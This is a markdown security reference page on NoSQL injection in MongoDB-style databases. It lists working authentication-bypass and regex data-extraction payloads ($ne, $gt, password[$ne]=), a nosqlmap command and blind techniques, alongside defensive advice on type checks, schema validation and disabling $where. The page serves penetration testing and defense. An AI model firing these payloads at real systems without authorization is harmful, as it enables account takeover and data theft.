# NoSQL Injection

Manipulate NoSQL query operators in MongoDB and similar databases.

## How It Works

NoSQL injection manipulates query documents in databases like MongoDB, CouchDB, or Elasticsearch when applications pass user input directly into query operators without type-safe binding.

Classic MongoDB authentication bypass:

```json
{"username": "admin", "password": {"$ne": ""}}
```

The `$ne` (not equal) operator makes the password clause always true.

Injection also targets:

- `$gt`, `$regex` for data extraction
- `$where` JavaScript execution (deprecated but historic)
- Aggregation pipeline injection

JSON APIs and mobile backends often accept rich JSON bodies—attackers send operator objects where strings were expected because server code lacks schema validation.

## Exploitation

**Authentication bypass**

POST JSON login:

```json
{
  "username": "admin",
  "password": {"$gt": ""}
}
```

**Data extraction via regex**

```json
{"email": {"$regex": "^a"}}
```

Iterate characters when response differs for matches.

**URL-encoded form (PHP apps)**

```
username=admin&password[$ne]=
```

**Attack flow**

```
JSON/query with operator objects → database interprets operators → auth bypass / data leak
```

**Tools**

```bash
nosqlmap -u "http://target.com/login" --data '{"user":"test","pass":"test"}'
```

**Blind techniques**

- Boolean: change `$regex` anchor and compare response length
- Timing: `$where` with `sleep` where JS execution enabled (rare today)

## Defense & Mitigation

**Type-safe queries**

- MongoDB Node driver: ensure fields are strings—`if (typeof password !== 'string') reject`.
- Use explicit operator allow-lists in query builders.

**Schema validation**

- JSON Schema on API inputs rejecting objects where strings required.
- Disable `password[$ne]` style parameter pollution at framework level.

**Database config**

- Disable `$where` and server-side JS where not needed.
- Least privilege DB users without eval rights.

**Parameterized patterns**

- Use ORM/query builders that separate operators from user values structurally.

**Testing**

- Fuzz JSON fields with `{"$gt":""}` replacements in all API endpoints.

## Methodology

- [ ] Test JSON bodies with $ne, $gt, $regex operators
- [ ] Bypass authentication with operator injection
- [ ] Extract data via boolean-based inference
- [ ] Review ORM and driver sanitization

## Tools

| Tool | Usage |
|------|-------|
| `burp` | [Intercept, repeater & scanner](../../TOOLS_GUIDE.md#burp-suite) |
| `nosqlmap` | [NoSQL injection](../../TOOLS_GUIDE.md#nosqlmap) |

## Resources

- [PayloadsAllTheThings NoSQL](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)

## Verification Checklist

- [ ] Review scope and rules of engagement
- [ ] Document baseline behavior
- [ ] Test edge cases and parser differentials
- [ ] Capture proof-of-concept safely
- [ ] Write remediation guidance
